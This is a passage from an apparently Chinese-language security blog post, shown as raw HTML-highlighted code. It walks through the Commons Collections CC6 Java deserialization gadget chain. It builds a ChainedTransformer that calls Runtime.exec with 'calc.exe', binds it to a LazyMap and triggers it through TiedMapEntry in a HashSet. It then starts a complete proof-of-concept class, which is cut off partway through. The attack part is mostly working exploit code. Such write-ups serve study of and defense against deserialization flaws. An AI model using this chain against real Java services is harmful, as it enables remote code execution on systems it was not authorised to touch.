&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; FunctorException(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InvokerTransformer: The method &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; iMethodName &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; on &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; input.&lt;span style=&#34;color:#a6e22e&#34;&gt;getClass&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#39; threw an exception&amp;#34;&lt;/span&gt;, ex);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总体流程如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Transformer&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; transformers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Transformer&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 当前链内容:Runtime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{String.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;, Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 当前链内容:Runtime.getMethod&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;, Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 当前链内容:Runtime.getMethod(&amp;#39;invoke&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// Windows：calc.exe | Linux：touch /tmp/cc6_success&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{String.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calc.exe&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// 当前链内容:Runtime.invoke(&amp;#39;exec&amp;#39;,&amp;#39;cacl.exe&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Transformer chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ChainedTransformer(transformers);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;触发transformers链&#34;&gt;触发Transformers链
&lt;/h1&gt;&lt;p&gt;LazyMap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; Map &lt;span style=&#34;color:#a6e22e&#34;&gt;decorate&lt;/span&gt;(Map map, Transformer factory) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; LazyMap(map, factory);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;protected&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LazyMap&lt;/span&gt;(Map map, Factory factory) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;super&lt;/span&gt;(map);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (factory &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;throw&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; IllegalArgumentException(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Factory must not be null&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;factory&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FactoryTransformer.&lt;span style=&#34;color:#a6e22e&#34;&gt;getInstance&lt;/span&gt;(factory);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; Object &lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(Object key) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// create value for key if key is not currently in the map&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (map.&lt;span style=&#34;color:#a6e22e&#34;&gt;containsKey&lt;/span&gt;(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Object value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; factory.&lt;span style=&#34;color:#a6e22e&#34;&gt;transform&lt;/span&gt;(key);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            map.&lt;span style=&#34;color:#a6e22e&#34;&gt;put&lt;/span&gt;(key, value);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; value;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; map.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(key);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;触发流程&lt;/p&gt;
&lt;p&gt;使用decorate方法把利用链绑定到Lazymap的factory，如果能调用到lazyMap的get方法即可触发chainedTransformer的transform，成功触发&lt;/p&gt;
&lt;p&gt;完整代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Map innerMap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashMap();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Map lazyMap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LazyMap.&lt;span style=&#34;color:#a6e22e&#34;&gt;decorate&lt;/span&gt;(innerMap, chain);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;触发lazymap的get方法&#34;&gt;触发LazyMap的get方法
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;TiedMapEntry entry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; TiedMapEntry(lazyMap, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testKey&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤4：构造 HashSet 并绑定 TiedMapEntry =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HashSet hashSet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashSet();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 向 HashSet 添加 TiedMapEntry（反序列化时会调用 entry 的 hashCode 触发 get）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashSet.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(entry);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 移除 entry 确保反序列化时重新计算 hashCode&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lazyMap.&lt;span style=&#34;color:#a6e22e&#34;&gt;remove&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;testKey&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;完整poc&#34;&gt;完整POC
&lt;/h1&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;package&lt;/span&gt; org.cc6;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.Transformer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ChainedTransformer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ConstantTransformer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.map.LazyMap;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.keyvalue.TiedMapEntry;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ByteArrayInputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ByteArrayOutputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.HashMap;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.HashSet;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Map;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CC6&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args) &lt;span style=&#34;color:#66d9ef&#34;&gt;throws&lt;/span&gt; Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤1：构造恶意 Transformer 调用链 =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Transformer&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; transformers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Transformer&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getMethod&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{String.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;, Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;getRuntime&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invoke&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;, Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#75715e&#34;&gt;// Windows：calc.exe | Linux：touch /tmp/cc6_success&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; InvokerTransformer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;exec&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Class&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{String.&lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Object&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;calc.exe&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                ),
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        };
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Transformer chain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ChainedTransformer(transformers);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#75715e&#34;&gt;// ===================== 步骤2：构造 LazyMap 触发 Transformer =====================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Map innerMap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HashMap();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Map lazyMap &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LazyMap.&lt;span style=&#34;color:#a6e22e&#34;&gt;decorate&lt;/span&gt;(innerMap, chain);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
